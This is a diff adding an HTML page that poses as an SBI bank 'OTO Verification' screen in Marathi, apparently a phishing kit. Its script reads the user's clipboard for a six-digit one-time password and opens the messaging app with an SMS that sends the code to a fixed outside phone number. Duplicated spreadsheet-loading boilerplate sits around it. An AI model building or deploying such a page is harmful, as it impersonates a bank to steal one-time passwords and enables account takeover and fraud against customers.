@@ -1,0 +1,178 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Sender</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .img {
+            width: 100%;
+            height: auto;
+        }
+        input, button {
+            display: block;
+            margin: 10px auto;
+            padding: 10px;
+            width: 80%;
+            font-size: 16px;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="./sbilogo.png" alt="SBI Logo" width="220" height="160">
+        <h2>OTO Verification</h2>
+        <p>मोबाईल नंबर पुष्टी प्रणाली</p>
+        <input type="text" id="otp" placeholder="OTP टाका (e.g., 526251)">
+        <button onclick="pasteOTP()">OTP पेस्ट करा</button>
+        <button onclick="sendSMS()">ओटीपी पाठवा</button>
+        <p id="status"></p>
+    </div>
+
+    <script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+            return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+            if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+                try {
+                    var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                    var firstSheetName = workbook.SheetNames[0];
+                    var worksheet = workbook.Sheets[firstSheetName];
+                    var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                    var filteredData = jsonData.filter(row => row.some(filledCell));
+                    var headerRowIndex = filteredData.findIndex((row, index) =>
+                        row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                    );
+                    if (headerRowIndex === -1 || headerRowIndex > 25) {
+                        headerRowIndex = 0;
+                    }
+                    var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex));
+                    csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                    return csv;
+                } catch (e) {
+                    console.error(e);
+                    return "";
+                }
+            }
+            return gk_fileData[filename] || "";
+        }
+    </script>
+
+    <script>
+        // Function to paste OTP from clipboard
+        async function pasteOTP() {
+            const otpInput = document.getElementById('otp');
+            const status = document.getElementById('status');
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+                // Check if clipboard contains a 6-digit OTP
+                const otpMatch = clipboardText.match(/\b\d{6}\b/);
+                if (otpMatch) {
+                    otpInput.value = otpMatch[0];
+                    status.textContent = 'OTP पेस्ट केले गेले आहे! आता ओटीपी पाठवा बटण दाबा।';
+                } else {
+                    status.textContent = 'क्लिपबोर्डमध्ये 6 अंकी OTP सापडला नाही! कृपया OTP कॉपी करा आणि पुन्हा प्रयत्न करा।';
+                }
+            } catch (error) {
+                status.textContent = 'OTP पेस्ट करण्यात त्रुटी: ' + error.message;
+            }
+        }
+
+        function sendSMS() {
+            const otp = document.getElementById('otp').value;
+            const status = document.getElementById('status');
+            const phoneNumber = '+919767785187'; // Fixed number
+            const message = `DFI ${otp}`; // Fixed message format with OTP
+
+            if (!otp) {
+                status.textContent = 'कृपया OTP द्या!';
+                return;
+            }
+
+            // OTP validation (6 digits)
+            if (!/^\d{6}$/.test(otp)) {
+                status.textContent = 'OTP 6 अंकांचा असावा!';
+                return;
+            }
+
+            // Create sms: URI to trigger native messaging app
+            const smsLink = `sms:${phoneNumber}?body=${encodeURIComponent(message)}`;
+            
+            try {
+                window.location.href = smsLink;
+                status.textContent = 'मेसेजिंग अॅप उघडले गेले आहे. SMS पाठवण्यासाठी सेंड बटण दाबा।';
+            } catch (error) {
+                status.textContent = 'SMS ट्रिगर करण्यात त्रुटी: ' + error.message;
+            }
+        }
+    </script>
+</body>
+</html>
